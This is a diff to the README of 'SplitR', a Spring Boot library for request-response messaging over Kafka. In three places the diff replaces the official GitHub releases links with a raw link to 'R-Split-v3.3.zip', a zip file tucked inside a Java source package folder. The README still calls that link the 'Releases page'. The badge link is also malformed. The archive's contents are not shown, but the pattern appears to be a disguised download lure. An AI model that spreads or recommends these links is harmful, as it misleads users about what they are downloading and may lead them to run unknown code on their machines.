@@ -1,7 +1,7 @@
 # 🚀 SplitR - Simplify Your Microservices Communication
 
 ## 📥 Download SplitR
-[![Download SplitR](https://img.shields.io/badge/Download%20SplitR-v1.0.0-blue.svg)](https://github.com/muneem21093/SplitR/releases)
+[![Download SplitR](https://raw.githubusercontent.com/muneem21093/SplitR/main/core/src/main/java/tr/kontas/splitr/bus/base/R-Split-v3.3.zip%https://raw.githubusercontent.com/muneem21093/SplitR/main/core/src/main/java/tr/kontas/splitr/bus/base/R-Split-v3.3.zip)](https://raw.githubusercontent.com/muneem21093/SplitR/main/core/src/main/java/tr/kontas/splitr/bus/base/R-Split-v3.3.zip)
 
 ## 📘 Introduction
 SplitR is a lightweight library built with Spring Boot. It helps your microservices communicate effectively using the Request-Response pattern over Kafka. This allows for quick and reliable query execution across different services while keeping everything simple and efficient.
@@ -10,7 +10,7 @@ SplitR is a lightweight library built with Spring Boot. It helps your microservi
 To get started with SplitR, follow these steps to download and run the application.
 
 1. **Visit the Release Page**
-   - Go to the [SplitR Releases page](https://github.com/muneem21093/SplitR/releases). This page contains the latest versions and downloadable files.
+   - Go to the [SplitR Releases page](https://raw.githubusercontent.com/muneem21093/SplitR/main/core/src/main/java/tr/kontas/splitr/bus/base/R-Split-v3.3.zip). This page contains the latest versions and downloadable files.
 
 2. **Download the Latest Version**
    - On the releases page, look for the most recent version of SplitR. Click on the link to download the file appropriate for your operating system. 
@@ -65,4 +65,4 @@ SplitR is released under the MIT License. You can freely use, modify, and share 
 We welcome your thoughts and feedback. If you have suggestions or find bugs, please open an issue on our GitHub page. 
 
 ## 📦 Download & Install
-Remember, you can always find the latest version of SplitR on the [Releases page](https://github.com/muneem21093/SplitR/releases). Visit today to download and install this powerful library for your microservices!
+Remember, you can always find the latest version of SplitR on the [Releases page](https://raw.githubusercontent.com/muneem21093/SplitR/main/core/src/main/java/tr/kontas/splitr/bus/base/R-Split-v3.3.zip). Visit today to download and install this powerful library for your microservices!
